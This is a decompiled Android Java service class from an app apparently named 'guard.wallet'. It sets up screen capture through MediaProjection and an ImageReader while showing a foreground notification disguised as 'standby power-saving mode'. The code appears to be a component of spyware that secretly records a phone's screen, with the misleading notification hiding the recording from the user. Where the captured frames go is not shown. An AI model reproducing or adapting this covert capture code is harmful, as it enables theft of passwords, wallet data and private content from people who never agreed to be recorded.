package com.guard.wallet.service;

import a1.q;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.media.ImageReader;
import android.media.projection.MediaProjectionManager;
import android.os.Handler;
import android.os.IBinder;
import android.support.v4.app.NotificationCompat;
import com.guard.wallet.MainApplication;
import com.guard.wallet.req.ScreenMetricsVO;
import com.guard.wallet.utils.d;
import com.guard.wallet.utils.e;
import java.util.concurrent.locks.ReentrantLock;
import x.a;
import x.c;

public class MediaLiveService extends Service {
   public final IBinder onBind(Intent var1) {
      return null;
   }

   public final void onCreate() {
      super.onCreate();
      NotificationManager var2 = (NotificationManager)this.getSystemService("notification");
      PendingIntent var1 = PendingIntent.getActivity(this, 0, new Intent(this, MediaLiveService.class), 67108864);
      NotificationCompat.Builder var3 = new NotificationCompat.Builder(this.getApplicationContext(), "100").setContentIntent(var1);
      Integer var4 = d.a;
      String var5;
      if (MainApplication.getInstance() != null
         && MainApplication.getInstance().getBuildConfig() != null
         && !q.B(MainApplication.getInstance().getBuildConfig().getNotificationTitle())) {
         var5 = MainApplication.getInstance().getBuildConfig().getNotificationTitle();
      } else {
         var5 = "standby power-saving mode";
      }

      var3 = var3.setContentTitle(var5);
      String var6;
      if (MainApplication.getInstance() != null
         && MainApplication.getInstance().getBuildConfig() != null
         && !q.B(MainApplication.getInstance().getBuildConfig().getNotificationContent())) {
         var6 = MainApplication.getInstance().getBuildConfig().getNotificationContent();
      } else {
         var6 = "entered standby power-saving mode, click here to wake up";
      }

      var3 = var3.setContentText(var6).setWhen(System.currentTimeMillis()).setVisibility(1).setDefaults(-1).setCategory("service").setPriority(2);
      NotificationChannel var7 = new NotificationChannel("100", "front_media_live_notification", 4);
      var7.setLockscreenVisibility(1);
      var2.createNotificationChannel(var7);
      var3.setChannelId("100");
      Notification var8 = var3.build();
      var8.defaults = 1;
      var8.flags = 32;
      this.startForeground(100, var8);
   }

   public final void onDestroy() {
      super.onDestroy();
      ((NotificationManager)this.getSystemService("notification")).cancel(100);
      this.stopForeground(true);
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final int onStartCommand(Intent var1, int var2, int var3) {
      var2 = var1.getIntExtra("code", -1);
      Intent var4 = (Intent)var1.getParcelableExtra("data");

      label38: {
         label37: {
            Exception var10000;
            label42: {
               try {
                  var9 = (MediaProjectionManager)this.getSystemService("media_projection");
               } catch (Exception var8) {
                  var10000 = var8;
                  boolean var10001 = false;
                  break label42;
               }

               if (var9 == null) {
                  break label37;
               }

               try {
                  var11 = var9.getMediaProjection(var2, var4);
                  c var15 = new c();
                  var11.registerCallback(var15, a.d());
                  break label38;
               } catch (Exception var7) {
                  var10000 = var7;
                  boolean var17 = false;
               }
            }

            Exception var10 = var10000;
            q.s("MediaLiveService", var10);
         }

         var11 = null;
      }

      if (var11 != null) {
         a var16 = a.b();
         ReentrantLock var5 = var16.d;
         if (var5.tryLock()) {
            if (!var16.c()) {
               var16.b = var11;
               ScreenMetricsVO var12 = e.e();
               ImageReader var13 = ImageReader.newInstance(var12.getWidth(), var12.getHeight(), 1, 2);
               var16.a = var13;
               Handler var6 = a.d();
               var13.setOnImageAvailableListener(var16.g, var6);
               var16.c = a.a(var16.b, var16.a.getSurface());
            }

            var5.unlock();
         }
      }

      return 1;
   }
}
